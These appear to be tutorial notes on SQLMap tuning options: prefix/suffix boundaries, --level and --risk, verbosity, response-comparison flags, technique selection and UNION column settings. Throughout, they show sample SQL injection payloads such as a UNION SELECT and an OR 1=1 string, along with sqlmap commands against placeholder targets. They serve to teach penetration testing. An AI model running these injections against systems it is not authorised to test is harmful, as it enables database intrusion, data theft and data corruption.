#

## 1. Payload Parts

Every SQLMap payload has 2 main parts:

### A. Vector

The actual SQL injection code.

Example:

```sql
UNION ALL SELECT 1,2,VERSION()
```

Purpose:

- Executes SQL commands
    
- Extracts database info
    

Think:

> Vector = Main attack code

---

### B. Boundaries

Extra characters added before and after the vector so the payload fits correctly into the SQL query.

Example:

```sql
'<vector>-- -
```

Here:

- Prefix = `'`
    
- Suffix = `-- -`
    

Think:

> Boundaries = Wrappers around payload

---

# Prefix/Suffix

Sometimes SQLMap’s default payload format does not work because the SQL query structure is unusual.

In such cases, we manually add:

- `--prefix`
    
- `--suffix`
    

Example:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

---

## Why Needed?

Suppose backend query is:

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
```

The parameter is inside:

```sql
(('value'))
```

Normal payload may break syntax.

So we add matching prefix/suffix.

---

## Final Injection Becomes

Payload:

```sql
UNION ALL SELECT 1,2,VERSION()
```

Final query:

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

## Easy Understanding

|Part|Meaning|
|---|---|
|Vector|Actual SQL injection|
|Prefix|Added before payload|
|Suffix|Added after payload|
|Purpose|Make payload fit correctly into query|

# Level/Risk

SQLMap normally uses:

- Common payloads
    
- Safe payloads
    
- Fast detection
    

But we can make SQLMap:

- Try more payloads
    
- Test more aggressively
    

Using:

```bash
--level
--risk
```

---

# 1. --level

Range:

```bash
1 - 5
```

Default:

```bash
--level=1
```

Purpose:

- Increases number of payloads
    
- Increases boundaries tested
    
- Tests more locations
    

Higher level:

- More payloads
    
- More thorough
    
- Slower
    

---

## Example

```bash
sqlmap -u www.example.com/?id=1 --level=5
```

SQLMap now tests:

- More quote styles
    
- More boundary combinations
    
- More injection points
    

---

## Easy Understanding

|Level|Meaning|
|---|---|
|1|Fast/basic testing|
|5|Very detailed testing|

---

# 2. --risk

Range:

```bash
1 - 3
```

Default:

```bash
--risk=1
```

Purpose:

- Uses more dangerous payloads
    

Higher risk may:

- Modify database
    
- Cause delays
    
- Cause crashes
    

---

## Example

```bash
sqlmap -u target --risk=3
```

Now SQLMap may use:

- OR payloads
    
- Heavy queries
    
- Dangerous tests
    

---

## Easy Understanding

|Risk|Meaning|
|---|---|
|1|Safe payloads|
|3|Aggressive payloads|

---

# Why Higher Risk Can Be Dangerous

Some payloads may affect database queries like:

```sql
UPDATE
DELETE
```

Especially OR-based injections.

Example:

```sql
' OR 1=1--
```

Could accidentally affect all rows.

---

# Using -v For Payload Visibility

Verbosity option:

```bash
-v
```

Shows payloads SQLMap is using.

---

## Example

```bash
sqlmap -u target -v 3
```

Shows:

```text
[PAYLOAD] 1 AND 7496=4313
```

---

## Higher Level Example

```bash
sqlmap -u target --level=5 --risk=3 -v 3
```

Shows many more payloads and DBMS-specific tests.

---

```bash
--level=1 --risk=1
```

```text
72 payloads
```

# Important Note

Higher values:

- Slower scans
    
- More requests
    
- More noisy
    
- Higher chance of detection
    

Usually:

```bash
Default settings are enough
```

Increase only when:

- Normal scan fails
    
- Login pages require OR payloads
    
- Complex injections exist

# Advanced Tuning

Used when normal detection is not enough.

---

# 1. Status Codes (`--code`)

Used when:

- TRUE response gives one HTTP code
    
- FALSE response gives another
    

Example:

- TRUE → 200 OK
    
- FALSE → 500 Error
    

Command:

```bash
sqlmap --code=200
```

Meaning:

> Treat HTTP 200 as TRUE response

---

# 2. Titles (`--titles`)

Compares:

```html
<title>
```

tags instead of full page.

Useful when:

- Page content changes a lot
    
- Title changes are easier to detect
    

Command:

```bash
sqlmap --titles
```

---

# 3. Strings (`--string`)

Used when TRUE response contains a specific word.

Example:

- TRUE page contains:
    

```text
success
```

Command:

```bash
sqlmap --string=success
```

Meaning:

> If "success" appears → injection TRUE

---

# 4. Text-only (`--text-only`)

Removes HTML tags and compares only visible text.

Ignores:

- `<script>`
    
- `<style>`
    
- `<meta>`
    

Useful for:

- Dynamic pages
    
- Noisy HTML
    

Command:

```bash
sqlmap --text-only
```

---

# 5. Techniques (`--technique`)

Forces SQLMap to use specific SQLi types.

---

## Technique Letters

|Letter|Technique|
|---|---|
|B|Boolean-based blind|
|E|Error-based|
|U|UNION query|
|T|Time-based blind|
|S|Stacked queries|

---

## Example

```bash
sqlmap --technique=BEU
```

Uses only:

- Boolean-based
    
- Error-based
    
- UNION
    

Skips:

- Time-based
    
- Stacked queries
    

---

## Why Useful?

Sometimes:

- Time-based payloads are slow
    
- Some techniques crash app
    
- You only want specific SQLi types
    

---

# UNION SQLi Tuning

Used when UNION attacks need manual help.

---

# 1. `--union-cols`

Specifies number of columns.

Example:

```bash
sqlmap --union-cols=17
```

Meaning:

> Vulnerable query has 17 columns

---

# 2. `--union-char`

Changes filler value used by SQLMap.

Default fillers:

- NULL
    
- Random numbers
    

Sometimes target rejects them.

Example:

```bash
sqlmap --union-char='a'
```

Now SQLMap uses:

```sql
UNION SELECT 'a','a','a'
```

---

# 3. `--union-from`

Adds:

```sql
FROM table
```

Needed in some DBMS like Oracle.

Example:

```bash
sqlmap --union-from=users
```

Final query may become:

```sql
UNION SELECT 1,2 FROM users
```
